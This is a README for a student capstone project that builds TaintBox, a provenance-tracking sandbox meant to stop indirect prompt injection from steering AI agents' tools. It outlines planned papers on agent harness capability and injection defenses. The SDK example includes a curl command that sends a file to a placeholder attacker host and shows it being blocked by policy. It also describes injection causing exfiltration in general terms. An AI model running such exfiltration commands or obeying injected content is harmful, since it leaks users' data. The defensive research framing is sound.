# TaintBox: A Taint-Tracked Sandbox Runtime and Agent-Computer Interface for AI Agents

**Penn State DS 440 Capstone — Fall 2026 | Group 2: Nittany Street**  
**Instructor:** Dr. Robert Thomson (`rht5162@psu.edu`)  
**Deliverables:** Business-grade technical report, working sandbox runtime, and two research papers.

---

## 1. Executive Summary

The agent-computer interface (ACI) is the single biggest capability lever in modern AI. The same frontier model executing on a raw shell performs at one level, while on a purpose-built execution harness (SWE-agent, ExploitBench) it performs at an entirely different tier. 

Simultaneously, agent deployments suffer from a critical vulnerability: **untrusted content** (emails, web scrapes, tool responses) flows into model context without provenance. Indirect prompt injection converts the agent's privileged tools into an adversary's tools.

**TaintBox** bridges this gap by delivering an instrumented sandbox execution runtime with three core primitives:

1. **Snapshot and Rewind**: Time-travel execution enabling agents to run, observe, branch, and roll back state across typed, structured tools without burning context on shell navigation.
2. **Taint-Tracked I/O**: Byte- and object-level provenance tracking. Untrusted data carries taint metadata throughout reads, transformations, and memory. Policy rules enforce boundary safety: tainted data cannot trigger privileged actions (network egress, shell exec, deletion).
3. **Telemetry by Construction**: Every execution stream automatically records provenance paths, side effects, and policy decisions—acting as an auditable compliance log and an empirical research dataset.

---

## 2. Research Program: Two Papers

TaintBox is designed not merely as software plumbing, but as a dual-purpose scientific instrument:

- **Paper 1 (Capability — The ACI Curve):** Measures model performance across execution harnesses holding the underlying model fixed:
  - Condition A: Raw shell without observation channel
  - Condition B: Structured typed tools
  - Condition C: Structured tools with snapshot-rewind
  - Condition D: Full ACI with provenance surfaced to the model
- **Paper 2 (Defense — Taint as the Trust Boundary):** Measures prompt injection mitigation against a diverse attack corpus (direct, indirect, multi-turn, tool poisoning):
  - Evaluates baseline vs. prompt hardening vs. TaintBox boundary policy vs. combined defense.
  - Tests whether boundary policy prevents exfiltration and action-on-objectives attacks that bypass prompt-only defenses.

---

## 3. Architecture

```text
Agent (LangChain, smolagents, Custom Harness, SDK)
        │
        ▼
[TaintBox API Gateway]   (REST / Python SDK / Session Store)
        │
        ▼
[ACI Layer]              (Typed tools: read, write, exec, observe, snapshot, rewind, fetch)
        │
        ▼
[Taint Engine]           (Provenance ledger, propagation rules, boundary policy enforcer)
        │
        ▼
[Sandbox Runtime]        (Isolated process sandbox / gVisor microVM adapter)
        │
        ▼
[Telemetry Sink]         (Structured JSONL event logs, attack traces, research metrics)
```

### Component Structure

- `src/taintbox/aci/`: Structured tool definitions (`read`, `write`, `exec`, `observe`, `snapshot`, `rewind`, `fetch`) and observation channel.
- `src/taintbox/taint/`: Provenance tracking ledger, propagation logic, and boundary policy evaluation.
- `src/taintbox/runtime/`: Sandbox execution backends (isolated process, container, gVisor microVM adapter).
- `src/taintbox/telemetry/`: Structured event streams and audit trail exporters.
- `src/taintbox/api/`: REST API service and client SDKs.
- `src/taintbox/eval/`: Benchmark runners for Paper 1 (Capability) and Paper 2 (Defense).
- `config/`: Default security policies (`policy.default.yaml`) and runtime configs (`runtime.yaml`).
- `legacy/tca/`: Historical scaffolding from previous Cross Asset TCA proposal.

---

## 4. Team Structure & Responsibilities

| Role | Owner | Focus Area |
|---|---|---|
| **Product Owner / Lead Author** | Harsh | Vision, ACI design, Paper 1 lead, sponsor alignment |
| **Scrum Master / Process Lead** | Aryamaan | Sprint planning, Kanban, progress reports |
| **Data and Infrastructure Lead** | Ammar | Runtime, taint engine, eval harness, CI/CD |
| **Attack and Security Lead** | Akshat | Injection corpus, red team models, Paper 2 lead |
| **Evaluation and Reliability** | Saathvik | Metrics, reproducibility, ablations, telemetry |

---

## 5. Quick Start

### Installation

```bash
git clone https://github.com/xyzmr114/ds440-nittanystreet.git
cd ds440-nittanystreet
uv sync
```

### Running Tests

```bash
uv run pytest
# or with python:
python -m pytest tests/ -v
```

### Example Usage (Python SDK)

```python
from taintbox.aci.harness import ACIHarness
from taintbox.models import ProvenanceTag, TrustLevel

# Initialize harness with policy enforcement
harness = ACIHarness()

# 1. Ingest untrusted content (automatically tagged as untrusted)
harness.fetch("https://external-site.com/payload.txt", tag=ProvenanceTag.UNTRUSTED_WEB)

# 2. Take a snapshot before taking actions
snap = harness.snapshot("pre-action")

# 3. Execution attempting exfiltration with tainted data will be blocked
result = harness.exec("curl", ["https://attacker.com", "--data", "@payload.txt"])
print(result.status)  # "BLOCKED_BY_POLICY"

# 4. Rewind cleanly to snapshot
harness.rewind(snap.snapshot_id)
```

---

## 6. Documentation & Specifications

- [`PROPOSAL.md`](PROPOSAL.md) — Official DS 440 capstone proposal document.
- [`AGENTS.md`](AGENTS.md) — Comprehensive technical specification and ground rules for AI agents and human developers.
- [`config/policy.default.yaml`](config/policy.default.yaml) — Default boundary rules and trust levels.

---

## 7. License

Public domain (Unlicense). See [LICENSE](LICENSE).
